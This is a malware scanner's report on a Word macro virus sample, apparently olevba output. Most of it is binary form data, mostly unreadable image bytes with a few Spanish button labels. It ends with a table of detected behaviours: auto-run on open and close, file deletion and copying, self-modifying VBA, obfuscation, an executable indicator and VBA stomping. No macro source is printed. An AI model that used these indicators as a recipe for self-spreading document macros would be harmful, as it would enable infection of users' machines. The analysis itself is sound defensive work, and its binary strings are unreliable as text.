VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B��������s�����9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��������s�k!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZν�ν�ν�ν������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ν�ֽ�ֽ�ֽ�����������ބ��k�Ɯ�Ɯ�Ɯ�Ɯ����������΄�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ�Μ��������1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kBsZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9��������s��s��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��������s�k!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZν�ν�ν�ν������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ֽ�ֽ��Ɯ�Ɯ�����������ccZB�Ɯ�Ɯ�Μ�Μ����������ք�Μ�Μ�Μ�Μ�Μ������ΜƵ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�kB�kB�kB�kB�kB�kB�c)�kB�kB�Z1�Z1�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1{R)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9��������s��s��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��������s�k)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sZν�ν�ν�ν������������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ν�ֽ�ֽ�ֽ������������ccZB�Ɯ�Ɯ�Ɯ�Μ����������΄�Μ�Μ�Μ�Μ�Μ��������B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1�kB�c)�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1{R)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��������s��s��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ބ1�����s��k�k!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{ZƵ�Ƶ�Ƶ�Ƶ�����������R!J9!Ƶ�ν�ν�ν������������ccZBֽ�ֽ�ֽ�ֽ�����������΄�Μ�Μ�Μ�Μ�Μ�������k)J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1{R)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)�����s��k��s��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{1�����cƄBcZ9cZ9cR1��kƭ{ƭ{ƭ{ƭ{������sZ9kZ9{kJƵ�Ƶ�Ƶ�Ƶ������������ZcZBƵ�ֽ�ֽ�ֽ������������sֽ�ֽ�ֽ�ֽ�ֽ����޵s�sJ�kB��Z������!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)�����s��k��s��1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{1��s��s��s��s��s��s��{��{��{��{��{ƭ{��s��s��s��{ƭ{ƭ{ƭ{ƭ{�����������ZZZ9ƭ{Ƶ�ƭ{Ƶ���������s��sƵ�Ƶ�ֽ�ֽ�ֽ�ֽ�ƭ{ƭ{ƭ{��������s!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1{R)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��s��s��k��s��1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ބ1��s��s��s��k��s��s��s��s��k��k��k��k��k��k��k��k��k��k��k��k�����������ZZZ9ƭ{ƭ{ƭ{ƭ{��������s��kƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{ƭ{��������c!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZB1�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��1��s��k��k��c�k!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{1��k��c��c��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k��k�����������BZJ1��k��kƜkΥs��������cޥcΥsΥsΥsΥsΥsΥsΥsΥsΥs��������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB)�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��s��Z��)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{1��k��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c�ޔ�����9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZJ1��k��k��k��k������Z9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sJƜkƜkƜkƜkƜkƜkƜkƜkƜk������J1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kB�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1{R)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!�{1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!ބ1kR9kR9kR9kR9kR9kR9kR9kR9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9��RΜZ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!{cB{cB{cB{cB֥c9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RB){cB{cB{cB{cB�kB�kB�kB�kB�kB��cJ9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1sJ!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelarq
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Siempre adelante ! ! ! !...
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/i12/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaR
-------------------------------------------------------------------------------
VBA FORM Variable "b'Aceptar'" IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cancelar'" IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/i12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Aceptar_Click       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ACCESO.EXE          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

